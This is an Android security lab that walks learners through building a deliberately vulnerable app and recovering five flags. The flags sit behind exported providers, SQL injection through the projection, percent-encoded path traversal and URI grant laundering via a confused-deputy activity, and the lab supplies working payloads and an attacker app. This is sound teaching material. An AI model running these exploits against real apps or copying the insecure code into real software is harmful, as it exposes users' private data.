# Lab 05 — CTF: The Provider Gauntlet

**Difficulty:** Advanced
**Time:** 4–6 hours
**Prerequisites:** Labs [01](lab-01-enumerate-and-read.md)–[04](lab-04-call-rpc.md),
[Chapter 27 §5 in full](../README.md#5-security-perspective),
[26-Intent](../../26-Intent/README.md) for the grant-laundering flag.

---

## The challenge

One APK. Five flags, each behind a different provider weakness, arranged so that the easy ones teach you
what you need for the hard ones. Every flag is a string of the form `GAUNTLET{...}`.

**Recover all five flags, and for each one write the finding the way it would appear in a report:** the
declaration or code that caused it, the exploit, the *reproduced-from-an-unprivileged-app* evidence, an
honest severity with its precondition, and the fix as code.

```
Flag 1  —  An exported provider you can simply read.               (Beginner)
Flag 2  —  A provider whose authority is not the one you expect.   (Enumeration)
Flag 3  —  Injection that works ONLY through the projection.       (Intermediate)
Flag 4  —  A traversal that only an ENCODED payload reaches.       (Intermediate)
Flag 5  —  A URI grant laundered through a forwarding activity.    (Advanced)
```

## Rules

- **No `run-as`, no reading the flags off disk with a debug build, no decompiling the flag constants and
  reading them directly.** Each flag must be recovered through the provider mechanism it is meant to
  teach. (Decompiling to find the *authority* or the *method name* is expected and fine — that is
  reconnaissance. Reading the flag string straight out of a `static final String` is not.)
- **Flag 5 must be recovered from an unprivileged app**, not from `adb shell`. The whole point of the
  final flag is the confused-deputy mechanism, which `adb shell`'s privilege would let you skip.
- For every flag, you must be able to state *why* the naive first attempt failed.

> **🔍 Pentester's Note**
> Flags 1–4 can each be *demonstrated* from `adb shell`, but a real engagement requires reproducing them
> from an ordinary app UID. Build the probe app early and confirm every flag through it, not just through
> the shell. The gap between "worked in the shell" and "worked from an app" is the entire subject of
> this chapter — do not let the CTF talk you out of the discipline the labs drilled.

---

## Building the challenge

Build it yourself — implementing the weaknesses is half the education, and you cannot write the fix for
a bug you did not construct. Create one app, `com.gauntlet.target`, with the components below.

### The manifest

```xml
<!-- target — AndroidManifest.xml -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.gauntlet.target">
    <application android:label="Gauntlet">

        <!-- Flag 1: the obvious one -->
        <provider
            android:name=".PublicProvider"
            android:authorities="com.gauntlet.target.public"
            android:exported="true" />

        <!-- Flag 2: authority deliberately NOT matching the class or package suffix,
             and NOT referenced in any obvious string -->
        <provider
            android:name=".HiddenProvider"
            android:authorities="com.gauntlet.x7fa.core"
            android:exported="true" />

        <!-- Flag 3: projection-only injection -->
        <provider
            android:name=".ReportProvider"
            android:authorities="com.gauntlet.target.reports"
            android:exported="true" />

        <!-- Flag 4: encoded traversal in openFile -->
        <provider
            android:name=".VaultProvider"
            android:authorities="com.gauntlet.target.vault"
            android:exported="true" />

        <!-- Flag 5: the privileged provider (NOT exported) + the deputy activity -->
        <provider
            android:name=".SecretProvider"
            android:authorities="com.gauntlet.target.secret"
            android:exported="false"
            android:grantUriPermissions="true" />

        <activity
            android:name=".ForwarderActivity"
            android:exported="true" />

    </application>
</manifest>
```

### Flag 1 — `PublicProvider` (exported, just read it)

```java
// target — PublicProvider.java  (abridged: a query() returning one flag row)
public class PublicProvider extends ContentProvider {
    public Cursor query(Uri u, String[] p, String s, String[] a, String o) {
        MatrixCursor c = new MatrixCursor(new String[]{"flag"});
        c.addRow(new Object[]{ "GAUNTLET{exported_is_the_default_finding}" });
        return c;
    }
    public boolean onCreate() { return true; }
    public String getType(Uri u) { return "vnd.android.cursor.dir/flag"; }
    public Uri insert(Uri u, ContentValues v) { return null; }
    public int update(Uri u, ContentValues v, String s, String[] a) { return 0; }
    public int delete(Uri u, String s, String[] a) { return 0; }
}
```

### Flag 2 — `HiddenProvider` (find the authority)

Identical shape to `PublicProvider`, returning `GAUNTLET{authorities_are_not_secrets}`, but its
authority `com.gauntlet.x7fa.core` matches neither the class name nor the package suffix, so guessing
fails. It is discoverable only by enumeration (`dumpsys package providers`) or by mining the authority
string from the manifest.

### Flag 3 — `ReportProvider` (projection-only injection)

```java
// target — ReportProvider.java  (selection is SAFE; projection is NOT)
public Cursor query(Uri u, String[] proj, String sel, String[] selArgs, String sort) {
    SQLiteDatabase db = helper.getReadableDatabase();
    // The developer did the WHERE clause correctly — bound parameter, no concatenation.
    String cols = (proj == null) ? "title" : android.text.TextUtils.join(",", proj);
    // ...but concatenated the projection. Only the projection channel is injectable.
    return db.rawQuery("SELECT " + cols + " FROM reports WHERE published = ?",
                       new String[]{ "1" });
    // Seed a `secret_flags` table: GAUNTLET{projection_is_a_channel_too}
}
```

### Flag 4 — `VaultProvider` (encoded traversal only)

```java
// target — VaultProvider.java openFile
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    String name = uri.getLastPathSegment();
    // A real (naive) defence: reject any segment containing a literal '/', and any '..'.
    if (name == null || name.contains("/") || name.contains("..")) {
        throw new SecurityException("bad name");
    }
    File f = new File(getContext().getFilesDir() + "/vault/" + name);
    return ParcelFileDescriptor.open(f, ParcelFileDescriptor.MODE_READ_ONLY);
}
// Seed <files>/flag.txt (one level ABOVE vault/) = GAUNTLET{percent_2f_beats_the_blacklist}
```

The literal `/` and `..` checks run on the *raw* segment, but `getLastPathSegment()` returns the
*decoded* segment, so `..%2Fflag.txt` passes the check (no literal `/` or `..` in the encoded form) and
then resolves upward.

### Flag 5 — `SecretProvider` + `ForwarderActivity` (grant laundering)

```java
// target — SecretProvider: NOT exported, holds the crown-jewel flag, grantable by URI
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    File f = new File(getContext().getFilesDir(), "secret/flag.txt"); // GAUNTLET{confused_deputy_launders_grants}
    return ParcelFileDescriptor.open(f, ParcelFileDescriptor.MODE_READ_ONLY);
}

// target — ForwarderActivity: the deputy. Starts a caller-supplied intent and
// passes the result back with its flags intact. THE BUG.
public class ForwarderActivity extends Activity {
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Intent next = getIntent().getParcelableExtra("next_intent");   // attacker-authored
        if (next != null) { startActivityForResult(next, 1001); return; }
        // Normal path: the app grants its OWN secret URI to a chosen component.
        Intent res = new Intent();
        res.setData(Uri.parse("content://com.gauntlet.target.secret/flag"));
        res.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        setResult(RESULT_OK, res);
        finish();
    }
    protected void onActivityResult(int rq, int rs, Intent data) {
        setResult(rs, data); finish();   // faithfully forwards the grant to the caller
    }
}
```

`SecretProvider` is not exported, so a direct read is denied. But `ForwarderActivity`, running with the
target's identity, will issue a grant for `content://com.gauntlet.target.secret/flag` and return it —
and if the attacker supplies a `next_intent` that resolves back to the forwarder's own result path, or
simply invokes the forwarder's normal grant path and collects the returned URI, the grant lands in the
attacker's package.

### Build and install

```bash
# host
./gradlew :target:assembleDebug
adb install -r target/build/outputs/apk/debug/app-debug.apk
# Touch each authority once to seed the databases/files
adb shell content query --uri content://com.gauntlet.target.public/x 2>/dev/null
```

---

## Your first attempt (which will partly fail)

```bash
# adb shell — the naive sweep
content query --uri content://com.gauntlet.target.public/flags        # Flag 1: works
content query --uri content://com.gauntlet.target.core/flags          # guessed authority: fails
content query --uri content://com.gauntlet.target.reports/reports --where "1=1"   # selection: no leak
content read  --uri "content://com.gauntlet.target.vault/../flag.txt"  # literal ..: blocked
content read  --uri content://com.gauntlet.target.secret/flag         # not exported: denied
```

**Q0.** Four of those five failed. For each failure, state the *specific* reason — and note that each
reason maps to a different section of the chapter.

---

## Investigation

Work these before the solutions.

### Flag 2 — enumerate, do not guess

```bash
# adb shell — every authority the target declares, as the platform parsed it
dumpsys package com.gauntlet.target | grep -oE 'authority=[^ ]+'
```

**Q1.** What is the real authority of `HiddenProvider`? Which reconnaissance step would have found it
without the source (mine the manifest / `dumpsys` / `app.provider.finduri`)?

### Flag 3 — test all four channels, not just selection

```bash
# adb shell — selection is safe; try the projection
content query --uri content://com.gauntlet.target.reports/reports \
  --projection "(SELECT group_concat(flag) FROM secret_flags) AS s"
```

**Q2.** Why does `--where "1=1"` return nothing interesting while the projection payload leaks the flag?
Point to the exact line in `ReportProvider.query()` that makes selection safe and projection unsafe.

### Flag 4 — encode the traversal

```bash
# adb shell — literal .. is blocked; the encoded form is not
content read --uri "content://com.gauntlet.target.vault/..%2Fflag.txt"
```

**Q3.** Explain precisely why the `name.contains("/") || name.contains("..")` check passes the encoded
payload. At what point does `%2F` become `/`, relative to when the check runs?

### Flag 5 — launder the grant from an unprivileged app

This flag cannot be shell-shortcut. Build the attacker.

```java
// attacker app — collect the laundered grant and read the secret
public class Attack extends Activity {
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Intent outer = new Intent();
        outer.setComponent(new ComponentName(
                "com.gauntlet.target", "com.gauntlet.target.ForwarderActivity"));
        startActivityForResult(outer, 7001);   // triggers the forwarder's normal grant path
    }
    protected void onActivityResult(int rq, int rs, Intent data) {
        if (data == null || data.getData() == null) { return; }
        Uri u = data.getData();   // content://com.gauntlet.target.secret/flag, now granted to US
        try (InputStream in = getContentResolver().openInputStream(u);
             ByteArrayOutputStream o = new ByteArrayOutputStream()) {
            byte[] buf = new byte[4096]; int n;
            while ((n = in.read(buf)) > 0) o.write(buf, 0, n);
            Log.i("ATTACK", "FLAG5: " + o.toString("UTF-8"));
        } catch (Exception e) { Log.w("ATTACK", "" + e); }
    }
}
```

The attacker manifest needs `<queries><package android:name="com.gauntlet.target" /></queries>`.

**Q4.** `SecretProvider` is not exported and the attacker has no permission for it. Explain, step by
step, how the attacker nonetheless reads its file. Which component is the "confused deputy", and why is
the fix in that component rather than in `SecretProvider`?

**Q5.** The exploit above uses the forwarder's *normal* grant path. Now use the `next_intent` extra to
aim the deputy at an arbitrary URI. What does `FLAG_GRANT_PREFIX_URI_PERMISSION` add to the payload, and
when would it matter?

---

## Solutions

Do not read until you have recovered at least Flags 1–4.

<details>
<summary>Flag 1 — GAUNTLET{exported_is_the_default_finding}</summary>

```bash
content query --uri content://com.gauntlet.target.public/anything
```

The provider is exported with no permission; any path returns the flag row. The naive guess failed only
because the path was `flags` — the provider ignores the path entirely, so *any* path works. Lesson: an
exported provider with no permission is a finding before you write a payload.
</details>

<details>
<summary>Flag 2 — GAUNTLET{authorities_are_not_secrets}</summary>

The authority is `com.gauntlet.x7fa.core`, not anything you would guess.

```bash
dumpsys package com.gauntlet.target | grep -oE 'authority=[^ ]+'
content query --uri content://com.gauntlet.x7fa.core/x
```

The authority is a routing key printed in plain text by `dumpsys` and present in the manifest; it is not
a secret. Guessing the authority from the package name is the mistake; enumerating it is the fix.
</details>

<details>
<summary>Flag 3 — GAUNTLET{projection_is_a_channel_too}</summary>

Selection is bound (`WHERE published = ?`), so `--where` injection does nothing. The projection is
concatenated, so it is the live channel:

```bash
content query --uri content://com.gauntlet.target.reports/reports \
  --projection "(SELECT group_concat(flag) FROM secret_flags) AS s"
```

Lesson: testing only selection and declaring the provider clean misses the two channels
(projection, sort order) that cannot be bound. Scanners do exactly this.
</details>

<details>
<summary>Flag 4 — GAUNTLET{percent_2f_beats_the_blacklist}</summary>

```bash
content read --uri "content://com.gauntlet.target.vault/..%2Fflag.txt"
```

`getLastPathSegment()` returns the *decoded* segment. The `contains("/")`/`contains("..")` check ran on
the raw encoded form, which contains neither a literal `/` nor `..`. After the check, `%2F` is `/` and
the path resolves to `<files>/vault/../flag.txt` = `<files>/flag.txt`. Only canonicalisation with a
containment check stops this; a blacklist never will.
</details>

<details>
<summary>Flag 5 — GAUNTLET{confused_deputy_launders_grants}</summary>

Run the attacker app. It calls `ForwarderActivity`, which — with the target's identity — grants read on
`content://com.gauntlet.target.secret/flag` and returns it via `setResult`. `ActivityManagerService`
records the grant in favour of the *calling* package (the attacker), because the deputy issued a grant
carrying `FLAG_GRANT_READ_URI_PERMISSION` and passed it back. The attacker then
`openInputStream`s the URI directly and reads the flag, despite `SecretProvider` being unexported and
the attacker holding no permission.

The confused deputy is `ForwarderActivity`: it did exactly what it was built to do, but for the wrong
principal. The fix belongs there — clear grant flags and constrain the destination component before
starting or returning any intent that arrived from outside — not in `SecretProvider`, which behaved
correctly throughout. See [§5.4](../README.md#54-uri-permission-laundering-via-intent-redirection).
</details>

---

## Debrief questions

Answer in writing — this is the point of the lab.

1. Map each flag to the exact chapter section that describes its class. Which two flags share the root
   cause "a check ran on the wrong representation of the input"?
2. Flags 1–4 were demonstrable from `adb shell`; Flag 5 was not. Explain the privilege difference that
   makes grant laundering *require* an app while the others merely *should* use one.
3. For Flag 3, the developer correctly parameterised the `WHERE` clause. Argue whether that makes the
   finding more or less likely to survive a code review, and why.
4. Write the fix for Flag 4 as code. Then write the single sentence you would put in a report explaining
   why the developer's `contains("..")` check was not merely insufficient but actively misleading.
5. For Flag 5, the fix could go in three places: strip grant flags on the forwarded intent, constrain
   the destination component, or make `SecretProvider` non-grantable. Rank them by robustness and say
   which single one you would require in the report.
6. You are told a scanner "tests every content provider for injection and traversal". Which of these
   five flags would it plausibly miss, and what one question would you ask the vendor to find out?

---

## Success criteria

- [ ] You recovered all five flags
- [ ] You found Flag 2's authority by enumeration, not guessing, and can name the recon step
- [ ] You leaked Flag 3 through the projection after confirming selection was safe
- [ ] You reached Flag 4 with an encoded payload and explained why the blacklist passed it
- [ ] You recovered Flag 5 **from an unprivileged app**, through the confused deputy
- [ ] For every flag you can state why the naive first attempt failed, citing a specific mechanism
- [ ] You wrote each flag up as a report finding: cause, exploit, app-reproduced evidence, severity, fix
- [ ] You answered all six debrief questions in writing
- [ ] You can explain why Flag 5's fix belongs in the deputy, not the provider

---

## Note for instructors

The pedagogy is the *ordering*. Flag 1 rewards enumeration hygiene; Flag 2 punishes guessing; Flag 3
punishes single-channel injection testing; Flag 4 punishes blacklist thinking; Flag 5 forces the
unprivileged-app discipline the whole chapter is built on. Hand out Flags 1–4 first; introduce Flag 5
only once participants have internalised that `adb shell` is not an attacker. Participants who solve Flag
5 from the shell "because it is faster" have missed the entire point and should be asked to do it again
from an app with no permissions.
